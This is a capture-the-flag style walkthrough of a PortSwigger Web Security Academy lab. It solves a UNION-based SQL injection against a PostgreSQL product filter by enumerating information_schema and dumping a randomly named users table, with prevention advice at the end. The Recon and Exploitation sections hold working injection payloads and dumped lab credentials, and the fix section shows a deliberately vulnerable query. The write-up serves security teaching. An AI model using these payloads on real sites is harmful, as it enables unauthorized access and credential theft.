# PortSwigger — SQL Injection Attack, Listing the Database Contents on Non-Oracle Databases

`Web Security Academy` • `SQL Injection` • `Practitioner`

## TL;DR

A product category filter is vulnerable to UNION-based SQL injection. The table and column names holding credentials are unknown — full database enumeration via `information_schema` is required. Querying `information_schema.tables` then `information_schema.columns` reveals the obfuscated table `users_fbshcb` with columns `username_zbwsbb` and `password_rpzwsc`. Extracting the contents yields the administrator password.

**Lab URL:** `https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle`

---

## Challenge Description

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
>
> To solve the lab, log in as the `administrator` user.

**Context:**
- Difficulty: **Practitioner**
- Category: **SQL Injection — Examining the Database**
- Goal: Enumerate the database schema, extract credentials, and log in as `administrator`
- Backend DBMS: **PostgreSQL** (inferred from `information_schema` support and `--` comment syntax)

---

## Recon

### Step 1 — Identify the injection point

The application exposes a `category` GET parameter:

```
https://<lab-id>.web-security-academy.net/filter?category=Gifts
```

Appending `'` triggers a **500 Internal Server Error** — the parameter is injectable.

### Step 2 — Determine column count and comment syntax

```
/filter?category='+UNION+SELECT+NULL,NULL--
```

**Response: 200 OK** → **2 columns**, `--` is the valid comment delimiter ✅

### Step 3 — Confirm string-compatible columns

```
/filter?category='+UNION+SELECT+'test','test'--
```

Both `test` values appear in the page → **both columns accept string data** ✅

---

## Exploitation

### Step 4 — Enumerate all tables via `information_schema`

`information_schema` is a standard metadata schema available in PostgreSQL, MySQL, and Microsoft SQL Server. It exposes the full database structure without any special privileges.

```
/filter?category='+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

The response lists all tables in the database. Among the system tables, one stands out with an obfuscated name:

```
users_fbshcb
```

### Step 5 — Enumerate columns of the target table

```
/filter?category='+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_fbshcb'--
```

**Response reveals two columns:**

```
username_zbwsbb
password_rpzwsc
```

The table and column names are randomized — a deliberate obfuscation to prevent guessing. Without `information_schema` enumeration, this table would be impossible to target.

### Step 6 — Extract all credentials

```
/filter?category='+UNION+SELECT+username_zbwsbb,password_rpzwsc+FROM+users_fbshcb--
```

The injected query becomes:

```sql
SELECT name, description FROM products WHERE category = ''
UNION SELECT username_zbwsbb, password_rpzwsc FROM users_fbshcb--'
```

**Response:**

```
wiener      6vqb2622p9h23ybdpa11
administrator   caukkwqknvs2xvfsxp8d
carlos      7pc1yvcf6bi8mjhtbysc
```

All three accounts are fully dumped with plaintext passwords.

### Step 7 — Authenticate as administrator

Navigating to `/login`:
- **Username:** `administrator`
- **Password:** `caukkwqknvs2xvfsxp8d`

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
/filter?category=Gifts' → 500 error → injection confirmed
        ↓
' UNION SELECT NULL,NULL-- → 200 OK → 2 columns, -- works
        ↓
' UNION SELECT 'test','test'-- → both columns accept strings
        ↓
' UNION SELECT table_name,NULL FROM information_schema.tables--
→ target table identified: users_fbshcb
        ↓
' UNION SELECT column_name,NULL FROM information_schema.columns
  WHERE table_name='users_fbshcb'--
→ columns: username_zbwsbb, password_rpzwsc
        ↓
' UNION SELECT username_zbwsbb,password_rpzwsc FROM users_fbshcb--
→ full credential dump:
  administrator:caukkwqknvs2xvfsxp8d
        ↓
Login as administrator → LAB SOLVED ✅
```

---

## The `information_schema` Enumeration Technique

This lab introduces a critical real-world technique: **schema enumeration via `information_schema`**. Understanding it is essential for any SQL injection beyond simple data retrieval.

### Structure of `information_schema`

```
information_schema
├── tables          → lists all tables (table_name, table_schema, table_type)
├── columns         → lists all columns (table_name, column_name, data_type)
├── schemata        → lists all databases/schemas
└── ...
```

### Key queries

**List all user-created tables:**
```sql
SELECT table_name FROM information_schema.tables
WHERE table_schema = 'public'   -- PostgreSQL
-- or
WHERE table_type = 'BASE TABLE' -- excludes views and system tables
```

**List columns for a specific table:**
```sql
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_name = 'target_table'
```

**Why table/column names are randomized in this lab:**

PortSwigger randomizes the names (`users_fbshcb`, `username_zbwsbb`) to prevent students from skipping the enumeration phase by guessing common names like `users`, `username`, `password`. In real pentests, names are often predictable — but the enumeration methodology is identical regardless.

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Reference |
|---|---|
| **CWE-89** | Improper Neutralization of Special Elements in a SQL Command |
| **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor |
| **CWE-312** | Cleartext Storage of Sensitive Information |
| **OWASP A03:2021** | Injection |
| **CVSSv3** | 9.8 Critical (full unauthenticated credential dump) |

**Why this is critical:**

- The entire `users` table is dumped in **a single HTTP request** — no brute force, no noise
- Passwords are stored in **plaintext** — immediately usable with no cracking required
- `information_schema` is accessible to any DB user with basic `SELECT` privileges — no admin rights needed to enumerate the full schema
- The attack requires zero knowledge of the application's internal structure — everything is self-discoverable

**Real-world attack progression:**

```
information_schema.tables → find all tables
        ↓
information_schema.columns → find sensitive columns
        ↓
Direct SELECT on target table → dump credentials, PII, financial data
        ↓
Credential reuse → pivot to other services, email accounts, admin panels
```

---

### Secure Code Fix

**❌ Vulnerable code:**
```python
category = request.args.get('category')
query = f"SELECT name, description FROM products WHERE category = '{category}'"
results = db.execute(query)
```

**✅ Fixed with parameterized query:**
```python
query = "SELECT name, description FROM products WHERE category = %s"
results = db.execute(query, (request.args.get('category'),))
```

**✅ Hash passwords — never store plaintext:**
```python
import bcrypt

# On registration
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
db.execute("INSERT INTO users (username, password) VALUES (%s, %s)", (username, hashed))

# On login — compare hash, never store or compare plaintext
bcrypt.checkpw(input_password.encode(), stored_hash)
```

**✅ Restrict `information_schema` access:**
```sql
-- Grant only the minimum required privileges
GRANT SELECT ON products TO app_user;
-- Do NOT grant SELECT on information_schema or other system schemas
```

**Best Practices:**
1. **Parameterized queries** — prevents injection regardless of how creative the payload is
2. **Hash passwords with `bcrypt` or `argon2`** — plaintext storage turns SQLi into an instant full breach
3. **Least privilege** — the app's DB user should only access the tables it needs; `information_schema` access should be restricted where possible
4. **Generic error messages** — never expose SQL errors; they confirm the injection and reveal the DBMS
5. **Schema obfuscation is not a defense** — randomized table names slow down an attacker by seconds when `information_schema` is accessible

---

## Key Takeaways

**Technical Skills:**
- Confirmed SQL injection and determined 2-column string-compatible output via systematic UNION testing
- Used `information_schema.tables` to enumerate all tables without prior knowledge of the schema
- Used `information_schema.columns` with a `WHERE table_name=` filter to retrieve exact column names
- Extracted the full `users_fbshcb` table contents in a single UNION query
- Demonstrated that **obfuscated names provide zero protection** against enumeration-based attacks

**Security Concepts:**
- `information_schema` is the **universal schema map** for non-Oracle databases — available in PostgreSQL, MySQL, and MSSQL
- A successful UNION injection with `information_schema` access means **the entire database is readable** in a matter of minutes
- Plaintext password storage is an independent critical vulnerability — combined with SQLi it results in an **instant, complete credential breach**
- Security through obscurity (randomized names) is never a substitute for parameterized queries

---

## DBMS `information_schema` Availability

| DBMS | `information_schema` | Alternative |
|---|---|---|
| **PostgreSQL** | ✅ Available | `pg_catalog.pg_tables` |
| **MySQL / MariaDB** | ✅ Available | `SHOW TABLES` |
| **Microsoft SQL Server** | ✅ Available | `sys.tables`, `sys.columns` |
| **Oracle** | ❌ Not available | `all_tables`, `all_columns` |

---

## References

- [PortSwigger — Examining the Database in SQL Injection](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [PortSwigger — SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PostgreSQL `information_schema` Documentation](https://www.postgresql.org/docs/current/information-schema.html)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)